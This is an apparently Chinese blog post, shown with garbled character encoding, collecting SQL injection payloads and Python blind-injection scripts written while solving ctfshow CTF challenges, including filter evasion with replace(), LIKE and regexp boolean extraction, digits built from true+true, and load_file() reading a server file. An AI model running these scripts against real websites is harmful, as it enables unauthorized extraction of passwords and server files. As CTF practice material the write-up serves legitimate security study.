---
title: sqlæ³¨å…¥è„šæœ¬------æ­£åœ¨æ›´æ–°
date: 2024-05-22 14:55:12
permalink: /pages/e9d443/
categories:
  - web
tags:
  - 
author: 
  name: ajay
  link: https://the0n3.top
---
# sqlæ³¨å…¥çš„ä¸€äº›è„šæœ¬

è®°å½•ctfshowåˆ·é¢˜è¿‡ç¨‹çš„sql

[å‚è€ƒ](https://www.cnblogs.com/IFS-/p/17350543.html)  

â˜ğŸ¤“å¼ºçƒˆæ¨è

## 0-9è¿‡æ»¤

web174

payloadï¼š1'union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),'1','aa'),'2','bb'),'3','cc'),'4','dd'),'5','ee'),'6','ff'),'7','gg'),'8','hh'),'9','ii'),'0','jj'),'a' from ctfshow_user4 where username='flag'--+

è¿˜åŸè„šæœ¬

```python
# ä»£æ›¿0-9

nb='nbfnbcnbgnbdnbfnbfnbgnbcnbfnbhnbfFnbgnbgnbgBnbcnbgnbfnbbnbcnbenbcnbinbcnbdnbfnbdnbfnbcnbfnbfnbbDnbcnbgnbcnbcnbcnbdnbcnbbnbbDnbcnbdnbcnbgnbcnbjnbfnbdnbbDnbcnbhnbcnbanbcnbjnbcnbenbbDnbcnbfnbcnbbnbcnbjnbcnbjnbcnbcnbcnbdnbfnbanbcnbdnbfnbfnbcnbfnbcnbenbcnbhnbgD'

nb=nb.replace('aa','1').replace('bb','2').replace('cc','3').replace('dd','4').replace('ee','5').replace('ff','6').replace('gg','7').replace('hh','8').replace('ii','9').replace('jj','0')

flag = bytes.fromhex(nb).decode("ascii")

print(flag)
```

## èšåˆå‡½æ•°ç›²æ³¨


### æ¨¡ç³ŠåŒ¹é…

web 183

countèšåˆå‡½æ•°å’Œlikeæ¨¡ç³ŠåŒ¹é…----ç›²æ³¨

```python
import requests

url = 'https://a8c9b04b-1704-4e89-b693-c0a1eea8f61b.challenge.ctf.show/select-waf.php'
strlist = '{}0123456789-abcdef'
flag = ''

while True: #ä¸çŸ¥é“ flag é•¿åº¦
    #å¯¹ flag æŒ‰ä½åŒ¹é…
    for i in strlist:
        data = {
            'tableName': "`ctfshow_user`where`pass`like'ctfshow{}%'".format(flag+i)
        }
        respond = requests.post(url, data=data)  # è·å–é¡µé¢ä»£ç 
        respond = respond.text  # è§£ææˆå­—ç¬¦ä¸²ç±»å‹
        if 'user_count = 1' in respond:
            print('--------------------æ­£ç¡®',i)
            flag += i
            print('ctfshow{}'.format(flag))
            break
        else:print('==================='+i+'é”™è¯¯')
    if flag[-1] == '}':exit()   #åˆ¤æ–­ flag æ˜¯å¦è·å–å®Œæ•´
```

### æ­£åˆ™å‡½æ•°

countèšåˆå‡½æ•°å’Œregexpæ­£åˆ™åŒ¹é…----ç›²æ³¨

```python
import requests

url = 'http://8227d26e-6942-4c3b-bd58-6ab02995a7e7.challenge.ctf.show/select-waf.php'
strlist = '{0123456789-abcdef}'
flagstr = ''
flag = ''


while True: #ä¸çŸ¥é“ flag é•¿åº¦
    for i in strlist:
        j = hex(ord(i))[2:]     #hex() è½¬ä¸ºåå…­è¿›åˆ¶ï¼Œord() è½¬ä¸ºUnicodeç¼–ç 
        data = {
            'tableName': "ctfshow_user group by pass having pass regexp(0x{})".format(flagstr+j)
        }

        respond = requests.post(url, data=data)  # è·å–é¡µé¢ä»£ç 
        respond = respond.text  # è§£ææˆå­—ç¬¦ä¸²ç±»å‹
        if 'user_count = 1' in respond:
            print('--------------------æ­£ç¡®',i)
            flagstr += j
            flag += i
            print(flag)
            break
        else:print('==================='+i+'é”™è¯¯')
    if flag[-1] == '}':exit()   #åˆ¤æ–­ flag æ˜¯å¦è·å–å®Œæ•´
```

### æ„é€ æ•°å­—

web185-186

countèšåˆå‡½æ•°å’Œregexpæ­£åˆ™åŒ¹é…----ç›²æ³¨

ç¦ç”¨äº†æ•°å­—ï¼Œregexpçš„ä½¿ç”¨å—åˆ°å½±å“ï¼Œé€šè¿‡ä½¿ç”¨å¸ƒå°”å€¼æ„é€ æ•°å­—ï¼Œä¾‹å¦‚true+true=2

```python
import requests

url = 'https://3425520d-f6cb-4996-9d8b-477125e21e19.challenge.ctf.show/select-waf.php'
strlist = '{0123456789-abcdef}'
flagstr = ''
flag = ''
# powerå‡½æ•°  power(2,3)ï¼Œè¿”å›2^3
strdict = {'0':'false,','1':'true,','2':'(true+true),',
           '3':'(true+true+true),','4':'(true+true+true+true),',
           '5':'(true+true+true+true+true),','6':'(true+true+true+true+true+true),',
           '7':'(power((true+true),(true+true+true))-true),',
           '8':'(power((true+true),(true+true+true))),',
           '9':'(power((true+true),(true+true+true))+true),'
           }

# ä½è¿ç®—
# strdict = {'0':'false,','1':'true,','2':'(true<<true),',
#            '3':'((true<<true)+true),','4':'(true<<true+true),',
#            '5':'((true<<true+true)+true),','6':'((true<<true+true)+true+true),',
#            '7':'((true+true<<true+true)-true),',
#            '8':'(true+true<<true+true),',
#            '9':'((true+true<<true+true)+true),'
#            }

while True: #ä¸çŸ¥é“ flag é•¿åº¦
    for i in strlist:
        m = ''
        #å°†æ¯ä¸ªå­—ç¬¦è½¬æˆ Unicodeç¼–ç å¯¹åº”çš„åè¿›åˆ¶ï¼ˆUnicodeç¼–ç ä¸ºASCIIç æ‰©å±•ï¼‰
        #å¯¹å…¶åè¿›åˆ¶è¿›è¡Œæ‹†åˆ†è½¬æ¢ï¼Œè¿™æ ·å¯ä»¥é™ä½ä¸€ç‚¹æ—¶é—´å¤æ‚åº¦
        for x in str(ord(i)):
            m += strdict[x]
        m = 'char(concat('+m[:-1]+')),'

        data = {
            'tableName': "ctfshow_user group by pass having pass regexp(concat({}))".format(flagstr+m[:-1])
        }

        respond = requests.post(url, data=data)  # è·å–é¡µé¢ä»£ç 
        respond = respond.text  # è§£ææˆå­—ç¬¦ä¸²ç±»å‹
        if 'user_count = 1' in respond:
            print('--------------------æ­£ç¡®',i)
            flagstr += m
            flag += i
            print('ctfshow'+flag)
            break
        else:print('==================='+i+'é”™è¯¯')
    if flag[-1] == '}':exit()   #åˆ¤æ–­ flag æ˜¯å¦è·å–å®Œæ•´

```

### è¯»å–æ–‡ä»¶ç›²æ³¨

web189

é¢˜ç›®ç”¨æˆ·åä½¿ç”¨sqlè¯­å¥æ—¶,è¿”å›å¯†ç é”™è¯¯ï¼Œä½¿ç”¨éšæ„çš„ç”¨æˆ·åæ²¡æœ‰ååº”ï¼Œæ ¹æ®sqlè¯­å¥çš„æ‰§è¡Œåˆ¤æ–­

mysqlè¯»å–æ–‡ä»¶å‡½æ•°load_file()

```python
import requests
import time

url = "https://7b11607a-8b5a-419a-b339-18d672b8d36d.challenge.ctf.show/api/"
flagstr = "}{<>$=,;_ 'abcdefghijklmnopqr-stuvwxyz0123456789"

flag = ""
#è¿™ä¸ªä½ç½®ï¼Œæ˜¯ç¾¤ä¸»è€—è´¹å¾ˆé•¿æ—¶é—´è·‘å‡ºæ¥çš„ä½ç½®~
for i in range(257,257+60):
    for x in flagstr:
        data={
        # ç»“åˆsubstr()å‡½æ•°ï¼ŒåŒ¹é…æ–‡ä»¶æŸä¸ªä½ç½®çš„æŸå­—æ¯
        "username":"if(substr(load_file('/var/www/html/api/index.php'),{},1)=('{}'),1,0)".format(i,x),
        "password":"0"
        }
        print(data)
        response = requests.post(url,data=data)
        time.sleep(0.3)
        # 8d25æ˜¯username=1æ—¶çš„é¡µé¢è¿”å›å†…å®¹åŒ…å«çš„ï¼Œå…·ä½“å¯ä»¥çœ‹ä¸Šé¢çš„æˆªå›¾~
        if response.text.find("8d25")>0:
            print("++++++++++++++++++ {} is right".format(x))
            flag+=x
            break
        else:
            continue
    print(flag)
```